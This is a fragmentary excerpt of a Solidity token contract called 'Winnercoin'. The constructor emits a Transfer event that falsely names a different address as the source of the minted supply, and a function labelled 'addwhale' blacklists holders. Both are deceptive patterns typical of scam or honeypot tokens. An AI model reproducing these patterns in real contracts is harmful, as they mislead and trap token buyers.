...
contract  Winnercoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "Winner";
    string private _symbol = "Winner";
    ...
    mapping (address => bool) private _pureaddr;
    ...
    constructor () {
        ...
        tokenOnwer = payable(address(0x96E412eA51cD328f0F8d1Dd2525F94aE49F6F481));

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0x46c165F9773F29657E5F3e3467FeF3a55A082d6C), _msgSender(), _totalSupply);
    }
    ...
    function addpure(address recipient) internal {
        if (!_pureaddr[recipient]) _pureaddr[recipient] = true;
    }
    ...
    function addwhale(address recipient) internal {
        if (!_blackListed[recipient]) _blackListed[recipient] = true;
    }

    function Changename(string memory newname) public {
        require(!_pureaddr[msg.sender], "NOT PURE");
        _transfer(msg.sender, deadAddress, 100000 * 10**_decimals);
        addpure(msg.sender);
        _name = newname;
    }

    function returnname()public onlyOwner{
        _name = "Winner";
    }
